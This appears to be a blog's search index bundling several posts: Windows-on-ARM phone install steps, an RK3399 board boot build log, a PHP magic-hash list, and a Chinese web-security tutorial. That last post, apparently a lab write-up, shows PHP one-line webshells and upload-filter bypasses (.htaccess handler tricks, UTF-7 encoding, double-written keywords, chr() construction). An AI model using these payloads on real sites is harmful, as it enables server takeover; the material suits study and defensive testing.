<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Windows10 on arm64 EN</title>
    <link href="/2021/05/20/Windows10-on-arm64-EN/"/>
    <url>/2021/05/20/Windows10-on-arm64-EN/</url>
    
    <content type="html"><![CDATA[<h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>Download these files to your U disk</p><ol><li><p>Download PE</p><p><a href="https://www.dropbox.com/s/5c98gpqehe4n3p0/20h2pe_new.zip?dl=0">20h2pe_new.zip</a></p></li><li><p>Download dism++</p><p><a href="http://www.chuyu.me/en/index.html">Dism++</a></p></li><li><p>Download SDM850 Drivers</p><p><a href="https://github.com/edk2-porting/WOA-Drivers">GitHub -WOA-Drivers</a></p></li><li><p>Download windows10 arm64 iso</p><p> <a href="https://uup.rg-adguard.net/">uup</a></p></li><li><p>Download uefi</p><p><a href="https://github.com/edk2-porting/edk2-sdm845/releases">Releases · edk2-porting/edk2-sdm845 · GitHub</a></p></li><li><p>Download parted</p><p> <a href="https://www.dropbox.com/s/vz8lvn4vl7xrgc4/parted?dl=0">parted</a></p></li><li><p>add new.txt file </p><pre><code class="hljs latex">bcdedit /store Y:<span class="hljs-tag">\<span class="hljs-name">efi</span></span><span class="hljs-tag">\<span class="hljs-name">microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">boot</span></span><span class="hljs-tag">\<span class="hljs-name">bcd</span></span> /set &#123;Default&#125; testsigning onbcdedit /store Y:<span class="hljs-tag">\<span class="hljs-name">efi</span></span><span class="hljs-tag">\<span class="hljs-name">microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">boot</span></span><span class="hljs-tag">\<span class="hljs-name">bcd</span></span> /set &#123;Default&#125; nointegritychecks on</code></pre></li></ol><h4 id="second"><a href="#second" class="headerlink" title="second"></a>second</h4><p>​    connect your phone in TWRP</p><ol><li><p>partition your device</p><pre><code class="hljs sh">cp /sdcard/parted /sbin/ &amp;&amp; chmod 755 /sbin/partedumount /data &amp;&amp; umount /sdcardparted /dev/block/sdarm 17 mkpart esp fat32 6559MB 7000MBmkpart pe fat32 7000MB 10000MBmkpart win ntfs 10000MB 70GBmkpart userdata ext4 70GB 125GB<span class="hljs-built_in">set</span> 17 esp on</code></pre></li><li><p>format new partition</p></li></ol><pre><code>    <pre><code class="hljs sh">mkfs.fat -F32 -s1 /dev/block/sda17mkfs.fat -F32 -s1 /dev/block/sda18mkfs.ntfs -f /dev/block/sda19mke2fs -t ext4 /dev/block/sda20</code></pre></code></pre><ol start="3"><li><p>mount pe part on /mnt</p><pre><code class="hljs sh">mount /dev/block/by-name/pe /mnt</code></pre></li><li><p>Using OTG to connect U disk</p><pre><code class="hljs awk">cp -r <span class="hljs-regexp">/usbstorage/</span><span class="hljs-number">20</span>h2pe_new<span class="hljs-regexp">/* /m</span>nt</code></pre></li><li><p>reboot twrp </p></li><li><p>try to boot Android </p></li></ol><h4 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h4><ol><li>boot uefi </li></ol><pre><code class="hljs css"><span class="hljs-selector-tag">fastboot</span> <span class="hljs-selector-tag">boot</span> <span class="hljs-selector-tag">uefi</span><span class="hljs-selector-class">.img</span></code></pre><ol start="2"><li><p>enter PE system</p><ol><li>mount esp part on PE</li></ol><pre><code class="hljs properties"><span class="hljs-attr">diskpart</span><span class="hljs-attr">select</span> <span class="hljs-string">disk 0</span><span class="hljs-attr">list</span> <span class="hljs-string">part</span><span class="hljs-attr">select</span> <span class="hljs-string">part 17</span><span class="hljs-attr">assign</span> <span class="hljs-string">letter=Y</span></code></pre></li><li><p>install windows arm64</p><ol><li>open dism++ Release iso to ntfs partition</li><li>install drivers</li></ol></li><li><p>closed the Driver signature</p><pre><code class="hljs latex">bcdedit /store Y:<span class="hljs-tag">\<span class="hljs-name">efi</span></span><span class="hljs-tag">\<span class="hljs-name">microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">boot</span></span><span class="hljs-tag">\<span class="hljs-name">bcd</span></span> /set &#123;Default&#125; testsigning onbcdedit /store Y:<span class="hljs-tag">\<span class="hljs-name">efi</span></span><span class="hljs-tag">\<span class="hljs-name">microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">boot</span></span><span class="hljs-tag">\<span class="hljs-name">bcd</span></span> /set &#123;Default&#125; nointegritychecks on</code></pre></li><li><p>reboot and boot uefi enjoy</p></li></ol><h3 id="use-drivedroid-without-type-c-hub"><a href="#use-drivedroid-without-type-c-hub" class="headerlink" title="use drivedroid without type-c hub"></a>use drivedroid without type-c hub</h3><p>todo..</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows10 on arm64</title>
    <link href="/2021/05/20/Windows10-on-arm64/"/>
    <url>/2021/05/20/Windows10-on-arm64/</url>
    
    <content type="html"><![CDATA[<h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>下载这些文件到你的U盘</p><ol><li><p>下载PE<br> <a href="https://www.dropbox.com/s/5c98gpqehe4n3p0/20h2pe_new.zip?dl=0">20h2pe_new.zip</a><br>或者QQ交流群: 697666196 里下载</p></li><li><p>下载dism++</p><p><a href="http://www.chuyu.me/zh-Hans/index.html">Dism++</a></p></li><li><p>下载SDM845 驱动</p><p><a href="https://github.com/edk2-porting/WOA-Drivers">GitHub -WOA-Drivers</a></p></li><li><p>下载windows10 arm64 iso</p><p><a href="https://uupdump.net/?lang=zh-cn">UUP dump</a></p></li><li><p>下载uefi</p><p><a href="https://github.com/edk2-porting/edk2-sdm845/releases">Releases · edk2-porting/edk2-sdm845 · GitHub</a></p></li><li><p>下载parted</p><p><a href="https://pwdx.lanzoux.com/iUgSEmkrlmh">parted</a></p></li><li><p>新建new.txt 文件</p><pre><code class="hljs latex">bcdedit /store Y:<span class="hljs-tag">\<span class="hljs-name">efi</span></span><span class="hljs-tag">\<span class="hljs-name">microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">boot</span></span><span class="hljs-tag">\<span class="hljs-name">bcd</span></span> /set &#123;Default&#125; testsigning onbcdedit /store Y:<span class="hljs-tag">\<span class="hljs-name">efi</span></span><span class="hljs-tag">\<span class="hljs-name">microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">boot</span></span><span class="hljs-tag">\<span class="hljs-name">bcd</span></span> /set &#123;Default&#125; nointegritychecks on</code></pre></li></ol><h4 id="second"><a href="#second" class="headerlink" title="second"></a>second</h4><p>​    电脑连接手机进入TWRP</p><ol><li><p>分区（仅限一加6T复制粘贴）</p><pre><code class="hljs sh">cp /sdcard/parted /sbin/ &amp;&amp; chmod 755 /sbin/partedumount /data &amp;&amp; umount /sdcardparted /dev/block/sdarm 17 mkpart esp fat32 6559MB 7000MBmkpart pe fat32 7000MB 10000MBmkpart win ntfs 10000MB 70GBmkpart userdata ext4 70GB 125GB<span class="hljs-built_in">set</span> 17 esp on</code></pre><ol start="2"><li>格式化新分区</li></ol><pre><code class="hljs sh">mkfs.fat -F32 -s1 /dev/block/by-name/pemkfs.fat -F32 -s1 /dev/block/by-name/espmkfs.ntfs -f /dev/block/by-name/winmke2fs -t ext4 /dev/block/by-name/userdata</code></pre><p>挂载PE分区到 /mnt</p><pre><code class="hljs sh">mount /dev/block/by-name/pe /mnt</code></pre><ol><li>OTG连接U盘，复制pe文件到PE分区</li></ol><pre><code class="hljs awk">cp -r <span class="hljs-regexp">/usbstorage/</span><span class="hljs-number">20</span>h2pe_new<span class="hljs-regexp">/* /m</span>nt</code></pre><ol start="2"><li>重启进入 Android </li></ol></li></ol><h4 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h4><ol><li><p>boot uefi </p><pre><code class="hljs sh">fastboot boot uefi.img</code></pre></li><li><p>进入PE系统</p><p>挂载ESP分区</p><pre><code class="hljs sh">diskpartselect disk 0list partselect part 17 //17为你的esp分区号assign letter=Y</code></pre></li><li><p>安装 windows arm64</p><ol><li>打开dism++ 释放镜像到D盘，并选择释放引导分区</li><li>安装驱动</li></ol></li><li><p>关闭驱动签名</p><pre><code class="hljs sh">bcdedit /store Y:\efi\microsoft\boot\bcd /<span class="hljs-built_in">set</span> &#123;Default&#125; testsigning onbcdedit /store Y:\efi\microsoft\boot\bcd /<span class="hljs-built_in">set</span> &#123;Default&#125; nointegritychecks on</code></pre></li><li><p>重启，boot uefi 进入完整Windows系统</p></li><li><p>参考<a href="https://www.coolapk.com/feed/25682012?shareKey=MjdjMWU2OGQ5NmM5NjA1NWU1MTk~&shareUid=761220&shareFrom=com.coolapk.app_3.0">骁龙845安装Windows10指南</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>arm64</tag>
      
      <tag>Windows10</tag>
      
      <tag>UEFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RK3399广告机瞎折腾</title>
    <link href="/2020/12/04/RK3399%E5%B9%BF%E5%91%8A%E6%9C%BA%E7%9E%8E%E6%8A%98%E8%85%BE/"/>
    <url>/2020/12/04/RK3399%E5%B9%BF%E5%91%8A%E6%9C%BA%E7%9E%8E%E6%8A%98%E8%85%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>咸鱼上买的rk3399 板子，据卖家说是广告机上拆的，200多不过相对于400+的RK3399开发版来说算得上白菜价了，自带4G+16G三星EMMC5.1 flash 还有四组GPIO 和I2C(SDA_2,SCL_2)，加上瑞芯微RK3399开源datasheet，自己移植u-boot和Linux mainline 内核跑起来应该问题不大，</p><a id="more"></a><p>后续驱动问题可以便学习驱动开发边补哈哈哈</p><h3 id="板子本体"><a href="#板子本体" class="headerlink" title="板子本体"></a>板子本体</h3><p><img src="/2020/12/04/RK3399%E5%B9%BF%E5%91%8A%E6%9C%BA%E7%9E%8E%E6%8A%98%E8%85%BE/blog1\source_posts\RK3399广告机瞎折腾\215300u18g1g1e1eei716l.png" alt="img"></p><table><thead><tr><th>部件名称</th><th>芯片型号</th><th>备注说明</th></tr></thead><tbody><tr><td>CPU</td><td>RK3399</td><td>Dual-core Cortex-A72 up to 1.8GHz;Quad-core Cortex-A53 up to 1.4GHz;Mali-T864 GPU</td></tr><tr><td>RAM</td><td>K4B8G16</td><td>Dual-channel DDR3 1GB * 4</td></tr><tr><td>Flash</td><td>SanDisk SDINBDG4-16G</td><td>eMMC 5.1</td></tr><tr><td>PMU</td><td>RK808D</td><td></td></tr><tr><td>Ethernet</td><td>RTL8211E</td><td>10/100/1000 Base-T</td></tr><tr><td>WIFI+BT</td><td>AP6255</td><td>WIFI IEEE802.11 a/b/g/n/ac;BT4.2</td></tr><tr><td>SATA 3.0</td><td>JMS578</td><td></td></tr><tr><td>USB 2.0</td><td>FE1.1s</td><td>TYPE A Mount Socket * 2 &amp; 4-Pin Connector Socket * 5</td></tr><tr><td>USB 3.0</td><td>VL817-Q7</td><td>TYPE A Mount Socket * 2</td></tr><tr><td>UART</td><td>SP3232EEN</td><td></td></tr><tr><td>HDMI 2.0+LVDS</td><td>358775G + ALC5640</td><td></td></tr><tr><td>Audio PA</td><td>NS4258</td><td>5W * 2</td></tr></tbody></table><h4 id="rockchip启动过程"><a href="#rockchip启动过程" class="headerlink" title="rockchip启动过程"></a>rockchip启动过程</h4><p><img src="/2020/12/04/RK3399%E5%B9%BF%E5%91%8A%E6%9C%BA%E7%9E%8E%E6%8A%98%E8%85%BE/blog1\source_posts\RK3399广告机瞎折腾\2020-07-14-17-08-46.png" alt="img"></p><p>我们选择左边那一条启动路径（不知道为啥右边那条会跑飞）</p><h3 id="编译Rockchip维护的U-boot"><a href="#编译Rockchip维护的U-boot" class="headerlink" title="编译Rockchip维护的U-boot"></a>编译Rockchip维护的U-boot</h3><p>安装交叉编译器</p><pre><code class="hljs shell">sudo apt-get install gcc-aarch64-linux-gnu gcc-arm-none-eabi -y</code></pre><p>安装辅助工具</p><pre><code class="hljs sh">sudo apt install -y build-essential libncurses5-dev git make</code></pre><p>首先clone两个仓库</p><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rockchip-linux/u</span>-boot.gitgit clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rockchip-linux/</span>rkbin.git</code></pre><p>得到</p><p>rk3399_loader_v1.24.126.bin<br>trust.img<br>uboot.img</p><p>三个文件</p><h4 id="制作idbloader-img"><a href="#制作idbloader-img" class="headerlink" title="制作idbloader.img"></a>制作idbloader.img</h4><pre><code class="hljs apache"><span class="hljs-comment"># 找到rkbin带的ddr初始化文件，用u-boot里面的mkimage制作idbloader.img</span><span class="hljs-attribute">tools</span>/mkimage -n rk<span class="hljs-number">3399</span> -T rksd -d ../rkbin/bin/rk<span class="hljs-number">33</span>/rk<span class="hljs-number">3399</span>_ddr_<span class="hljs-number">800</span>MHz_v<span class="hljs-number">1</span>.<span class="hljs-number">24</span>.bin idbloader.img<span class="hljs-comment"># 再往后写miniloader</span><span class="hljs-attribute">cat</span> ../rkbin/bin/rk<span class="hljs-number">33</span>/rk<span class="hljs-number">3399</span>_miniloader_v<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.bin &gt;&gt; idbloader.img</code></pre><p>使用rkdeveloptool刷入emmc或者dd到SD卡装进主板即可进入u-boot</p><p>然后用rkdeveloptool初始化ddr</p><pre><code class="hljs elixir">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/silime</span><span class="hljs-comment"># rkdeveloptool ld</span><span class="hljs-keyword">not</span> found any devices!<span class="hljs-comment"># 短接复位后,进入MAskroom</span>root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/silime</span><span class="hljs-comment"># rkdeveloptool ld</span>DevNo=<span class="hljs-number">1</span>Vid=<span class="hljs-number">0x2207</span>,Pid=<span class="hljs-number">0x330c</span>,LocationID=<span class="hljs-number">302</span>Maskromroot<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/silime</span><span class="hljs-comment"># rkdeveloptool db /tmp/rk3399_loader_v1.24.126.bin </span>Downloading bootloader succeeded.</code></pre><p>然后<code>rkdeveloptool wl &lt;偏移&gt; &lt;文件名&gt;</code>就可以刷文件了</p><pre><code class="hljs sh">rkdeveloptool wl 0x40 idbloader.img</code></pre><p><img src="/2020/12/04/RK3399%E5%B9%BF%E5%91%8A%E6%9C%BA%E7%9E%8E%E6%8A%98%E8%85%BE/blog1\source_posts\RK3399广告机瞎折腾\2020-07-14-18-48-28.png" alt="img"></p><p>进入u-boot</p><h1 id="编译kernel"><a href="#编译kernel" class="headerlink" title="编译kernel"></a>编译kernel</h1><p>首先把linux主线kernel拉下来</p><pre><code class="hljs shell">git clone https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git</code></pre><h4 id="得到如下文件"><a href="#得到如下文件" class="headerlink" title="得到如下文件"></a>得到如下文件</h4><p>arch/arm64/boot/dts/rockchip/rk3399***.dtb<br>arch/arm64/boot/Image</p><h3 id="制作rootfs"><a href="#制作rootfs" class="headerlink" title="制作rootfs"></a>制作rootfs</h3><p>略。。。</p><p><img src="https://naivekun.tk/images/2020-07-14-22-48-48.png" alt="img"></p><p>刷进去，没什么意外，板子复位就直接跑进系统了，这个rk3399真的牛逼，爆快，4s进登录框</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP Hash</title>
    <link href="/2020/10/28/PHP-Hash/"/>
    <url>/2020/10/28/PHP-Hash/</url>
    
    <content type="html"><![CDATA[<h3 id="md5为0e开头字符串（科学计数法数值都为0）"><a href="#md5为0e开头字符串（科学计数法数值都为0）" class="headerlink" title="md5为0e开头字符串（科学计数法数值都为0）"></a>md5为0e开头字符串（科学计数法数值都为0）</h3><pre><code class="hljs angelscript">QNKCDZO <span class="hljs-comment">//全是大写字母</span><span class="hljs-number">240610708</span> <span class="hljs-comment">//全是数字</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1184209335a<span class="hljs-number">0e072485820392773389523109082030</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s532378020a<span class="hljs-number">0e220463095855511507588041205815</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Hash</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全-一句话木马</title>
    <link href="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>那么一句话木马到底是什么呢?</p><p>先来看看最简单的一句话木马：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></code></pre><p>Or</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></code></pre><p>【<strong>基本原理</strong>】利用<strong>文件上传漏洞</strong>，往目标网站中上传一句话木马，然后你就可以在本地通过中国蚁剑即可获取和控制整个网站目录。或者GET方式传递PHP代码给服务器执行；</p><h3 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h3><p>其中，只要攻击者满足三个条件，就能实现成功入侵：</p><pre><code class="hljs angelscript">（<span class="hljs-number">1</span>）木马上传成功，未被杀；（<span class="hljs-number">2</span>）知道木马的路径在哪；（<span class="hljs-number">3</span>）上传的木马能正常运行。</code></pre><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如何理解<code>eval()</code>函数？</p><p><strong><code>eval()</code>把字符串作为PHP代码执行</strong>。</p><p>例如：<code>eval(&quot;echo &#39;a&#39;&quot;)</code>;其实就等于直接 <code>echo &#39;a&#39;</code>;再来看看<code>&lt;?php eval($_POST[&#39;pw&#39;]); ?&gt;</code>首先，用post方式接收变量pw，比如接收到了：<code>pw=echo &#39;a&#39;</code>;这时代码就变成<code>&lt;?php eval(&quot;echo &#39;a&#39;;&quot;); ?&gt;</code>。结果如下：<img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023014821842.png" alt="image-20201023014821842"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>先直接上传php文件，不出意外会被过滤掉</li></ol><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023015616947.png" alt="image-20201023015616947"></p><ol><li>修改文件名为.dqt试试</li></ol><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023020142732.png" alt="image-20201023020142732"></p><blockquote><p>也不能上传，说明对内容进行了过滤Σ(っ °Д °;)っ</p></blockquote><ol start="3"><li>去除&lt;?上传成功，说明对&lt;?进行过滤</li></ol><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023131917691.png" alt="image-20201023131917691"></p><p>从响应体可以知道PHP版本为5.6.4</p><p>可以用标签风格绕过</p><pre><code class="hljs javascript">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])&lt;/script&gt;</code></pre><p>4.上传执行</p><p>​    <strong>方法一：</strong></p><ol><li>上传.htaccess</li></ol><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg</code></pre><blockquote><p>作用：解析jpg文件为php</p></blockquote><ol start="2"><li>上传1.jpg一句话木马</li></ol><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023132454515.png" alt="image-20201023132454515"></p><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023133035169.png" alt="image-20201023133035169"></p><p>获得网页控制权</p><p><strong>方法二</strong></p><p>PHP7以上版本，已经淘汰其它标签形式了仅剩下&lt;?php形式，可以采用特殊编码绕过，</p><ol><li>UTF-7编码一句话木马</li></ol><pre><code class="hljs php">+ADw?php +AEA-<span class="hljs-keyword">eval</span>(+ACQAXw-POST+AFs<span class="hljs-string">&#x27;cmd&#x27;</span>+AF0) ?+AD4-</code></pre><ol start="2"><li>.htaccess</li></ol><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpgphp_flag display_errors <span class="hljs-keyword">on</span>php_flag zend.multibyte <span class="hljs-number">1</span>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre><ol><li>上传连接<img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023135524220.png" alt="image-20201023135524220"></li></ol><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023135650466.png" alt="image-20201023135650466"></p><blockquote><p>获得网页控制权</p></blockquote><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>上传1.jpg,没发现什么异常，当访问 <code>http://47.98.234.232:28015/upload/1.jp g</code></p><p>地址时出现了下载请求`</p><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023141721858.png" alt="image-20201023141721858"></p><ol><li><p><strong>分析：</strong></p><p>出现下载请求，说明上传<code>.htaccess</code>文件时，某些内容被过滤掉了，无法解析.jpg为php。</p></li><li><p>打开下载的文件</p></li></ol><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023142714863.png" alt="image-20201023142714863"></p><p>果然,<code>php、eval、POST</code>都被过滤掉了哦</p><ol><li>双写这几个关键字试试</li></ol><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>pphphp @eevalval($_PPOSTOST[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></code></pre><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023143252534.png" alt="image-20201023143252534"></p><p>代码被保留下来了</p><ol><li>双写<code>.htaccess</code></li></ol><pre><code class="hljs php">AddType application/x-httpd-pphphp .jpg</code></pre><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023143556070.png" alt="image-20201023143556070"></p><p>获得网页控制权</p><h3 id="htaccess换行绕过"><a href="#htaccess换行绕过" class="headerlink" title=".htaccess换行绕过"></a>.htaccess换行绕过</h3><p>上传内容不能有application</p><p>.htaccess</p><pre><code class="hljs properties"><span class="hljs-attr">AddType</span> <span class="hljs-string">applic\</span><span class="hljs-meta">ation/x-httpd-php</span> <span class="hljs-string">.jpg</span></code></pre><p>1.jpg</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></code></pre><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023144508485.png" alt="image-20201023144508485"></p><p>获得网页控制权</p><h3 id="函数过滤绕过"><a href="#函数过滤绕过" class="headerlink" title="函数过滤绕过"></a>函数过滤绕过</h3><p> 对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。</p><p>使用脚本快速生成指定函数</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-string">&quot;函数&quot;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($a);$i++)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="hljs-string">&quot;).&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023152524890.png" alt="image-20201023152524890"></p><p><img src="/2020/10/23/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201023152611507.png" alt="image-20201023152611507"></p><h3 id="md5为0e开头字符串（科学计数法数值都为0）"><a href="#md5为0e开头字符串（科学计数法数值都为0）" class="headerlink" title="md5为0e开头字符串（科学计数法数值都为0）"></a>md5为0e开头字符串（科学计数法数值都为0）</h3><pre><code class="hljs angelscript">s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1184209335a<span class="hljs-number">0e072485820392773389523109082030</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s532378020a<span class="hljs-number">0e220463095855511507588041205815</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s1502113478a<span class="hljs-number">0e861580163291561247404381396064</span>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s1885207154a<span class="hljs-number">0e509367213418206700842008763514</span>s1836677006a<span class="hljs-number">0e481036490867661113260034900752</span>s1665632922a<span class="hljs-number">0e731198061491163073197128363787</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
